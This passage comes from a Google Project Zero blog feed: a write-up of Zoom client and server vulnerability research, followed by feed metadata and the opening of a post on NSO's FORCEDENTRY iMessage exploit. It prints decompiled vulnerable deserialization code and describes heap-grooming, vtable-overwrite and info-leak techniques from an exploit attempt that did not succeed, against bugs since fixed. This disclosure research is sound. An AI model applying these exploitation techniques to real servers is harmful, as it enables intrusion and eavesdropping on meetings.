 <p class="c1"><span>XMPP traffic seemed to be sent over SSL, so I located the </span><span class="c6">SSL_write</span><span>&nbsp;function in the binary based on log strings, and hooked it using </span><span class="c17"><a class="c81" href="https://frida.re/">Frida</a></span><span class="c2">. The output contained many XMPP stanzas (messages) as well as other network traffic, which I analyzed to determine how XMPP is used by Zoom. XMPP is used for most communication between Zoom clients outside of meetings, such as messages and channels, and is also used for signaling (call set-up) when a Zoom Contact invites another Zoom Contact to a meeting.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">I spent some time going through the client binary trying to determine how the client processes XMPP, for example, if a stanza contains a text message, how is that message extracted and displayed in the client. Even though the Zoom client contains many log strings, this was challenging, and I eventually asked my teammate Ned Williamson for help locating symbols for the client. He discovered that several old versions of the Android Zoom SDK contained symbols. While these versions are roughly five years old, and do not present a complete view of the client as they only include some libraries that it uses, they were immensely helpful in understanding how Zoom uses XMPP.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>Application-defined tags can be added to gloox&rsquo;s XMPP parser by extending the class </span><span class="c6">StanzaExtension</span><span>&nbsp;and implementing the method </span><span class="c6">newInstance</span><span>&nbsp;to define how the tag is converted into a C++ object. Parsed XMPP stanzas are then processed using the </span><span class="c6">MessageHandler</span><span>&nbsp;class. Application developers extend this class, implementing the method </span><span class="c6">handleMessage</span><span>&nbsp;with code that performs application functionality based on the contents of the stanza received. Zoom implements its XMPP handling in </span><span class="c6">CXmppIMSession::handleMessage</span><span>, which is a large function that is an entrypoint to most messaging and calling features. The final processing stage of many XMPP tags is in the class </span><span class="c6">ns_zoom_messager::CZoomMMXmppWrapper</span><span>, which contains many methods starting with &lsquo;On&rsquo; that handle specific events. I spent a fair amount of time analyzing these code paths, but didn&rsquo;t find any bugs. Interestingly, Thijs Alkemade and Daan Keuper released a </span><span class="c17"><a class="c81" href="https://sector7.computest.nl/post/2021-08-zoom/">write-up</a></span><span class="c2">&nbsp;of their Pwn2Own bug after I completed this research, and it involved a vulnerability in this area.</span></p><h2 class="c13" id="h.xi3fsuloyufo"><span>RTP Processing</span></h2>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>Afterwards, I investigated how Zoom clients process audio and video content. Like all other video conferencing systems that I have analyzed, it uses Real-time Transport Protocol (RTP) to transport this data. Based on log strings included in the Linux client binary, Zoom appears to use a branch of WebRTC for audio. Since I have looked at this library a great deal in </span><span class="c17"><a class="c81" href="https://googleprojectzero.blogspot.com/2018/12/adventures-in-video-conferencing-part-1.html">previous</a></span><span>&nbsp;</span><span class="c17"><a class="c81" href="https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html">posts</a></span><span class="c2">, I did not investigate it further. For video, Zoom implements its own RTP processing and uses a custom underlying codec named Zealot (libzlt).</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">Analyzing the Linux client in IDA, I found what I believed to be the video RTP entrypoint, and fuzzed it using afl-qemu. This resulted in several crashes, mostly in RTP extension processing. I tried modifying the RTP sent by a client to reproduce these bugs, but it was not received by the device on the other side and I suspected the server was filtering it. I tried to get around this by enabling end-to-end encryption, but Zoom does not encrypt RTP headers, only the contents of RTP packets (as is typical of most RTP implementations).</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>Curious about how Zoom server filtering works, I decided to set up </span><span class="c17"><a class="c81" href="https://support.zoom.us/hc/en-us/articles/360034064852-Zoom-On-Premise-Deployment">Zoom On-Premises Deployment</a></span><span class="c2">. This is a Zoom product that allows customers to set up on-site servers to process their organization&rsquo;s Zoom calls. This required a fair amount of configuration, and I ended up reaching out to the Zoom Security Team for assistance. They helped me get it working, and I greatly appreciate their contribution to this research.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>Zoom On-Premises Deployments consist of two hosts: the controller and the Multimedia Router (MMR)</span><span>.</span><span class="c2">&nbsp;Analyzing the traffic to each server, it became clear that the MMR is the host that transmits audio and video content between Zoom clients. Loading the code for the MMR process into IDA, I located where RTP is processed, and it indeed parses the extensions as a part of its forwarding logic and verifies them correctly, dropping any RTP packets that are malformed.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>The code that processes RTP on the MMR appeared different than the code that I fuzzed on the device, so I set up fuzzing on the server code as well. This was challenging, as the code was in the MMR binary, which was not compiled as a relocatable binary (more on this later). This meant that I couldn&rsquo;t load it as a library and call into specific offsets in the binary as I usually do to fuzz binaries that don&rsquo;t have source code available. Instead, I compiled my own fuzzing stub that called the function I wanted to fuzz as a relocatable that defined </span><span class="c6">fopen</span><span>, and loaded it using </span><span class="c6">LD_PRELOAD</span><span>&nbsp;when executing the MMR binary. Then my code would take control of execution the first time that the MMR binary called </span><span class="c6">fopen</span><span class="c2">, and was able to call the function being fuzzed.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>This approach has a lot of downsides, the biggest being that the fuzzing stub can&rsquo;t accept command line parameters, execution is fairly slow and a lot of fuzzing tools don&rsquo;t honor </span><span class="c6">LD_PRELOAD</span><span>&nbsp;on the target. That said, I was able to fuzz with code coverage using Mateusz Jurczyk&rsquo;s excellent </span><span class="c17"><a class="c81" href="https://github.com/googleprojectzero/DrSancov">DrSanCov</a></span><span class="c2">, with no results.</span></p><h2 class="c13" id="h.89pbrd4mybwj"><span class="c10">Packet Processing</span></h2>
 <p class="c1"><span>When analyzing RTP traffic, I noticed that both Zoom clients and the MMR server process a great deal of packets that didn&rsquo;t appear to be RTP or XMPP. Looking at the SDK with symbols, one library appeared to do a lot of serialization: libssb_sdk.so. This library contains a great deal of classes with the methods </span><span class="c6">load_from</span><span>&nbsp;and </span><span class="c6">save_to </span><span class="c2">defined with identical declarations, so it is likely that they all implement the same virtual class.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>One parameter to the </span><span class="c6">load_from</span><span>&nbsp;methods is an object of class </span><span class="c6">msg_db_t</span><span>, &nbsp;which implements a buffer that supports reading different data types. Deserialization is performed by </span><span class="c6">load_from</span><span>&nbsp;methods by reading needed data from the </span><span class="c6">msg_db_t</span><span>&nbsp;object, and serialization is performed by </span><span class="c6">save_to</span><span class="c2">&nbsp;methods by writing to it.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>After hooking a few </span><span class="c6">save_to</span><span>&nbsp;methods with Frida and comparing the written output to data sent with </span><span class="c6">SSL_write</span><span>, it became clear that these serialization classes are part of the remote attack surface of Zoom. Reviewing each </span><span class="c6">load_from</span><span>&nbsp;method, several contained code similar to the following (from</span><span class="c6">&nbsp;ssb::conf_send_msg_req::load_from</span><span class="c2">).</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c3">ssb::i_stream_t&lt;ssb::msg_db_t,ssb::bytes_convertor&gt;::operator&gt;&gt;(</span></p>
 <p class="c1 c19 c5"><span class="c3">msg_db, &amp;this-&gt;str_len, consume_bytes, error_out);</span></p>
 <p class="c1"><span class="c3">&nbsp; str_len = this-&gt;str_len;</span></p>
 <p class="c1"><span class="c3">&nbsp; if ( str_len )</span></p>
 <p class="c1"><span class="c3">&nbsp; {</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; mem = operator new[](str_len);</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; out_len = 0;</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; this-&gt;str_mem = mem;</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; ssb::i_stream_t&lt;ssb::msg_db_t,ssb::bytes_convertor&gt;::</span></p>
 <p class="c1 c5 c19"><span class="c3">read_str_with_len(msg_db, mem, &amp;out_len);</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c6">read_str_with_len </span><span>i</span><span class="c2">s defined as follows.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c3">int __fastcall ssb::i_stream_t&lt;ssb::msg_db_t,ssb::bytes_convertor&gt;::</span></p>
 <p class="c1 c5"><span class="c3">read_str_with_len(msg_db_t* msg, signed __int8 *mem,</span></p>
 <p class="c1 c5"><span class="c3">unsigned int *len)</span></p>
 <p class="c1"><span class="c3">{</span></p>
 <p class="c1"><span class="c3">&nbsp; if ( !msg-&gt;invalid )</span></p>
 <p class="c1"><span class="c3">&nbsp; {</span></p>
 <p class="c1 c5"><span class="c3">ssb::i_stream_t&lt;ssb::msg_db_t,ssb::bytes_convertor&gt;::operator&gt;&gt;(msg, len, (int)len, 0);</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; if ( !msg-&gt;invalid )</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; {</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; &nbsp; if ( *len )</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; ssb::i_stream_t&lt;ssb::msg_db_t,ssb::bytes_convertor&gt;::</span></p>
 <p class="c1"><span class="c3">read(msg, mem, *len, 0);</span></p>
 <p class="c1"><span class="c3">&nbsp; &nbsp; }</span></p>
 <p class="c1"><span class="c3">&nbsp; }</span></p>
 <p class="c1"><span class="c3">&nbsp; return msg;</span></p>
 <p class="c1"><span class="c3">}</span></p>
 <p class="c0"><span class="c3"></span></p>
 <p class="c1"><span>Note that the string buffer is allocated based on a length read from the </span><span class="c6">msg_db_t </span><span>buffer, but then a second length is read from the buffer and used as the length of the string that is read. This means that if an attacker could manipulate the contents of the </span><span class="c6">msg_db_t </span><span class="c2">buffer, they could specify the length of the buffer allocated, and overwrite it with any length of data (up to a limit of 0x1FFF bytes, not shown in the code snippet above). </span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>I tested this bug by hooking </span><span class="c6">SSL_write</span><span>&nbsp;with Frida, and sending the malformed packet, and it caused the Zoom client to crash on a variety of platforms. This vulnerability was assigned </span><span class="c17 c20"><a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2223">CVE-2021-34423</a></span><span class="c7">&nbsp;and fixed on November 24, 2021.</span></p>
 <p class="c0"><span class="c7"></span></p>
 <p class="c1"><span class="c11">Looking at the code for the MMR server, I noticed that </span><span class="c6">ssb::conf_send_msg_req::load_from</span><span class="c2">, the class the vulnerability occurs in was also present on the MMR server. Since the MMR forwards Zoom meeting traffic from one client to another, it makes sense that it might also deserialize this packet type. I analyzed the MMR code in IDA, and found that deserialization of this class only occurs during Zoom Webinars. I purchased a Zoom Webinar license, and was able to crash my own Zoom MMR server by sending this packet. I was not willing to test a vulnerability of this type on Zoom&rsquo;s public MMR servers, but it seems reasonably likely that the same code was also in Zoom&rsquo;s public servers.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>Looking further at deserialization, I noticed that all deserialized objects contain an optional field of type </span><span class="c6">ssb::dyna_para_table_t</span><span>, which is basically a properties table that allows a map of name strings to variant objects to be included in the deserialized object. The variants in the table are implemented by the structure </span><span class="c6">ssb::variant_t</span><span class="c2">, as follows.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c3">struct variant{</span></p>
 <p class="c0"><span class="c3"></span></p>
 <p class="c1 c5"><span class="c3">char type;</span></p>
 <p class="c1 c5"><span class="c3">short length;</span></p>
 <p class="c1 c5"><span class="c3">var_data data;</span></p>
 <p class="c0"><span class="c3"></span></p>
 <p class="c1"><span class="c3">};</span></p>
 <p class="c0"><span class="c3"></span></p>
 <p class="c1"><span class="c3">union var_data{</span></p>
 <p class="c1"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char i8;</span></p>
 <p class="c1"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char* i8_ptr;</span></p>
 <p class="c1"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short i16;</span></p>
 <p class="c1"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short* i16_ptr;</span></p>
 <p class="c1"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int i32;</span></p>
 <p class="c1"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int* i32_ptr;</span></p>
 <p class="c1"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;long long i64;</span></p>
 <p class="c1"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;long long i64*;</span></p>
 <p class="c1"><span class="c3">};</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">The value of the type field corresponds to the width of the variant data (1 for 8-bit, 2 for 16-bit, 3 for 32-bit and 4 four 64-bit). The length field specifies whether the variant is an array and its length. If it has the value 0, the variant is not an array, and a numeric value is read from the data field based on its type. If the length field has any other value, the data field is cast to a pointer, an array of that size is read.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">My immediate concern with this implementation was that it could be prone to type confusion. One possibility is that a numeric value could be confused with an array pointer, which would allow an attacker to create a variant with a pointer that they specify. However, both the client and MMR perform very aggressive type checks on variants they treat as arrays. Another possibility is that a pointer could be confused with a numeric value. This could allow an attacker to determine the address of a buffer they control if the value is ever returned to the attacker. I found a few locations in the MMR code where a pointer is converted to a numeric value in this way and logged, but nowhere that an attacker could obtain the incorrectly cast value. Finally, I looked at how array data is handled, and I found that there are several locations where byte array variants are converted to strings, however not all of them checked that the byte array has a null terminator. This meant that if these variants were converted to strings, the string could contain the contents of uninitialized memory.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>Most of the time, packets sent to the MMR by one user are immediately forwarded to other users without being deserialized by the server. For some bugs, this is a useful feature, for example, it is what allows CVE-2021-34423 discussed earlier to be triggered on a client. However, an information leak in variants needs to occur on the server to be useful to an attacker. When a client deserializes an incoming packet, it is for use on the device, so even if a deserialized string contains sensitive information, it is unlikely that this information will be transmitted off the device. Meanwhile, the MMR exists expressly to transmit information from one user to another, so if a string gets deserialized, there is a reasonable chance that it gets sent to another user, or alters server behavior in an observable way. So, I tried to find a way to get the server to deserialize a variant and convert it to a string. I eventually figured out that when a user logs into Zoom in a browser, the browser can&rsquo;t process serialized packets, so the MMR must convert them to strings so they can be accessed through web requests. Indeed, I found that if I removed the null terminator from the </span><span class="c6">user_name</span><span class="c2">&nbsp;variant, it would be converted to a string and sent to the browser as the user&rsquo;s display name.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>The vulnerability was assigned </span><span class="c17"><a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2235&q=zoom%5C&can=1">CVE-2021-34424</a></span><span class="c2">&nbsp;and fixed on November 24, 2021. I tested it on my own MMR as well as Zoom&rsquo;s public MMR, and it worked and returned pointer data in both cases.</span></p><h2 class="c13" id="h.mbswjzdihcwb"><span>Exploit Attempt</span></h2>
 <p class="c1"><span>I attempted to exploit my local MMR server with these vulnerabilities, and while I had success with portions of the exploit, </span><span>I was not able to get it working</span><span class="c2">. I started off by investigating the possibility of creating a client that could trigger each bug outside of the Zoom client, but client authentication appeared complex and I lacked symbols for this part of the code, so I didn&rsquo;t pursue this as I suspected it would be very time-consuming. Instead, I analyzed the exploitability of the bugs by triggering them from a Linux Zoom client hooked with Frida.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>I started off by investigating the impact of heap corruption on the MMR process. MMR servers run on CentOS 7, which uses a modern glibc heap, so exploiting heap unlinking did not seem promising. I </span><span>looked into overwriting the vtable of a C++ object allocated on the heap instead.</span></p>
 <p class="c1"><span class="c2">&nbsp;</span></p>
 <p class="c1"><span>I wrote several Frida scripts that hooked malloc on the server, and used them to monitor how incoming traffic affects allocation. It turned out that there are not many ways for an attacker to control memory allocation on an MMR server that are useful for exploiting this vulnerability. </span><span>There are several packet types that an attacker can send to the server that cause memory to be allocated on the heap and then freed when processing is finished, but not as many where the attacker can trigger both allocation and freeing.</span><span>&nbsp;Moreover, the MMR server performs different types of processing in separate threads that use unique heap arenas, so many areas of the code where this type of allocation is likely to occur, such as connection management, allocate memory in a different heap arena than the thread where the bug occurs. The only such allocations I could find that were made in the same arena were related to meeting set-up: when a user joins a meeting, certain objects are allocated on the heap, which are then freed when they leave the meeting. </span><span>Unfortunately, these allocations are difficult to automate as they require many unique users accounts in order for the allocation to be performed repeatedly, and allocation takes an observable amount of time (seconds).</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">I eventually wrote Frida scripts that looked for free chunks of unusual sizes that bordered C++ objects with vtables during normal MMR operation. There were a few allocation sizes that met this criteria, and since CVE-2021-34423 allows for the size of the buffer that is overflowed to be specified by the attacker, I was able to corrupt the memory of the adjacent object. Unfortunately, heap verification was very robust, so in most cases, the MMR process would crash due to a heap verification error before a virtual call was made on the corrupted object. I eventually got around this by focusing on allocation sizes that are small enough to be stored in fastbins by the heap, as heap chunks that are stored in fastbins do not contain verifiable heap metadata. Chunks of size 58 turned out to be the best choice, and by triggering the bug with an allocation of that size, I was able to control the pointer of a virtual call about one in ten times I triggered the bug.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>The next step was to figure out where to point the pointer I could control, and this turned out to be more challenging than I expected. The MMR process did not have ASLR enabled when I did this research (it was enabled in version 4.6.20211128.136, which was released on November 28, 2021), so I was hoping to find a series of locations in the binary that this call could be directed to that would eventually end in a call to </span><span class="c6">execv</span><span class="c2">&nbsp;with controllable parameters, as the MMR initialization code contains many calls to this function. However, there were a few features of the server that made this difficult. First, only the MMR binary was loaded at a fixed location. The heap and system libraries were not, so only the actual MMR code was available without bypassing ASLR. Second, if the MMR crashes, it has an exponential backoff which culminates in it respawning every hour on the hour. This limits how many exploit attempts an attacker has. It is realistic that an attacker might spend days or even weeks trying to exploit a server, but this still limits them to hundreds of attempts. This means that any exploit of an MMR server would need to be at least somewhat reliable, so certain techniques that require a lot of attempts, such as allocating a large buffer on the heap and trying to guess its location were not practical.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>I eventually decided that it would be helpful to allocate a buffer on the heap with controlled contents and determine its location. This would make the exploit fairly reliable in the case that the </span><span>overfl</span><span>ow successfully leads to a virtual call, as the buffer could be used as a fake vtable, and also contain strings that could be used as parameters to </span><span class="c6">execv</span><span class="c2">. I tried using CVE-2021-34424 to leak such an address, but wasn&rsquo;t able to get this working. </span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">This bug allows the attacker to provide a string of any size, which then gets copied out of bounds up until a null character is encountered in memory, and then returned. It is possible for CVE-2021-34424 to return a heap pointer, as the MMR maps the heap that gets corrupted at a low address that does not usually contain null bytes, however, I could not find a way to force a specific heap pointer to be allocated next to the string buffer that gets copied out of bounds. C++ objects used by the MMR tend to be virtual objects, so the first 64 bits of most object allocations are a vtable which contains null bytes, ending the copy. Other allocated structures, especially larger ones, tend to contain non-pointer data. I was able to get this bug to return heap pointers by specifying a string that was less than 64 bits long, so the nearby allocations were sometimes the pointers themselves, but allocations of this size are so frequent it was not possible to ascertain what heap data they pointed to with any accuracy.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>One last idea I had was to use another type confusion bug to leak a pointer to a controllable buffer. There is one such </span><span>bug</span><span>&nbsp;in the processing of deserialized </span><span class="c6">ssb::kv_update_req</span><span>&nbsp;objects. This object&rsquo;s </span><span class="c6">ssb::dyna_para_table_t </span><span>table contains a variant named </span><span class="c6">nodeid</span><span class="c2">&nbsp;which represents the specific Zoom client that the message refers to. If an attacker changes this variant to be of type array instead of a 32-bit integer, the address of the pointer to this array will be logged as a string. I tried to combine CVE-2021-34424 with this bug, hoping that it might be possible for the leaked data to be this log string that contains pointer information. Unfortunately, I wasn&rsquo;t able to get this to work because of timing: the log entry needs to be logged at almost exactly the same time as the bug is triggered so that the log data is still in memory, and I wasn&#39;t able to send packets fast enough. I suspect it might be possible for this to work with improved automation, as I was relying on clients hooked with Frida and browsers to interact with the Zoom server, but I decided not to pursue this as it would require tooling that would take substantial effort to develop.</span></p><h2 class="c13" id="h.oicfsqzplw6"><span class="c10">Conclusion</span></h2>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>I performed a security analysis of Zoom and reported two vulnerabilities. One was a buffer overflow that affected both Zoom clients and MMR servers, and one was an info leak that is only useful to attackers on MMR servers. Both of these vulnerabilities were fixed on November 24, 2021. </span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">The vulnerabilities in Zoom&rsquo;s MMR server are especially concerning, as this server processes meeting audio and video content, so a compromise could allow an attacker to monitor any Zoom meetings that do not have end-to-end encryption enabled. While I was not successful in exploiting these vulnerabilities, I was able to use them to perform many elements of exploitation, and I believe that an attacker would be able to exploit them with sufficient investment. The lack of ASLR in the Zoom MMR process greatly increased the risk that an attacker could compromise it, and it is positive that Zoom has recently enabled it. That said, if vulnerabilities similar to the ones that I reported still exist in the MMR server, it is likely that an attacker could bypass it, so it is also important that Zoom continue to improve the robustness of the MMR code. </span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>It is also important to note that this research was possible because Zoom allows customers to set up their own servers, meanwhile no other video conferencing solution with proprietary servers that I have investigated allows this, so it is unclear how these results compare to other video conferencing platforms.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">Overall, while the client bugs that were discovered during this research were comparable to what Project Zero has found in other videoconferencing platforms, the server bugs were surprising, especially when the server lacked ASLR and supports modes of operation that are not end-to-end encrypted. </span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>There are a few factors that commonly lead to security problems in videoconferencing applications that contributed to these bugs in Zoom. One is the huge amount of code included in Zoom. There were large portions of code that I couldn&rsquo;t determine the functionality of, and many of the classes that could be deserialized didn&rsquo;t appear to be commonly used. This both increases the difficulty of security research and increases the attack surface by making more code that could potentially contain vulnerabilities available to attackers. In addition, Zoom uses many proprietary formats and protocols which meant that understanding the attack surface of the platform and creating the tooling to manipulate specific interfaces was very time consuming. Using the features we tested also required paying roughly $1500 USD in licensing fees. These barriers to security research likely mean that Zoom is not investigated as often as it could be, potentially leading to simple bugs going undiscovered. &nbsp;</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span class="c2">Still, my largest concern in this assessment was the lack of ASLR in the Zoom MMR server. ASLR is arguably the most important mitigation in preventing exploitation of memory corruption, and most other mitigations rely on it on some level to be effective. There is no good reason for it to be disabled in the vast majority of software. There has recently been a push to reduce the susceptibility of software to memory corruption vulnerabilities by moving to memory-safe languages and implementing enhanced memory mitigations, but this relies on vendors using the security measures provided by the platforms they write software for. All software written for platforms that support ASLR should have it (and other basic memory mitigations) enabled.</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c1"><span>The closed nature of Zoom also impacted this analysis greatly. Most video conferencing systems use open-source software, either WebRTC or PJSIP. While these platforms are not free of problems, it&rsquo;s easier for researchers, customers and vendors alike to verify their security properties and understand the risk they present because they are open. Closed-source software presents unique security challenges, and Zoom could do more to make their platform accessible to security researchers and others who wish to evaluate it. While the Zoom Security Team helped me access and configure server software, it is not clear that support is available to other researchers, and licensing the software was still expensive. </span><span>Zoom, and other companies that produce closed-source security-sensitive software should consider how to make their software accessible to security researchers. </span></p>
 <p class="c0"><span class="c2"></span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/1246610633949568195/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/01/zooming-in-on-zero-click-exploits.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/1246610633949568195
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/1246610633949568195
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/01/zooming-in-on-zero-click-exploits.html
## @title
Zooming in on Zero-click Exploits
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-5073082417618502919
## published
15/12/2021 14:00:00
## updated
23/08/2022 16:03:57
## title
## @type
text
## #text
A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#b7b7b7;border-top-width:1pt;border-right-width:1pt;border-left-color:#b7b7b7;vertical-align:top;border-right-color:#b7b7b7;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#b7b7b7;border-bottom-style:solid}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c20{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c19{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right;height:11pt}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c14{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.c23{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c22{border-spacing:0;border-collapse:collapse;margin-right:auto}.c21{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c16{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c17{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c2{color:inherit;text-decoration:inherit}.c15{font-weight:400;font-family:Consolas,"Courier New"}.c6{font-weight:400;font-family:"Courier New"}.c8{font-weight:700}.c11{height:0pt}.c7{font-style:italic}.c10{height:11pt}.c18{background-color:#00ff00}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c17">
 <p class="c3"><span class="c5">Posted by Ian Beer &amp; Samuel Gro&szlig; of Google Project Zero</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c7">We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple&rsquo;s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis. The editorial opinions reflected below are solely Project Zero&rsquo;s and do not necessarily reflect those of the organizations we collaborated with during this research. </span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Earlier this year, Citizen Lab managed to capture an NSO iMessage-based zero-click exploit being used to target a Saudi activist.</span><span>&nbsp;</span><span>In this two-part blog post series we will describe </span><span>for the first time</span><span>&nbsp;how an in-the-wild zero-click iMessage exploit works.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Based on our research and findings, we </span><span>assess</span><span>&nbsp;this to be </span><span>one of the most technically sophisticated exploits we&#39;ve ever seen, further</span><span>&nbsp;demonstrating </span><span>that the capabilities NSO provides rival those previously thought to be accessible to only a handful of nation states.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
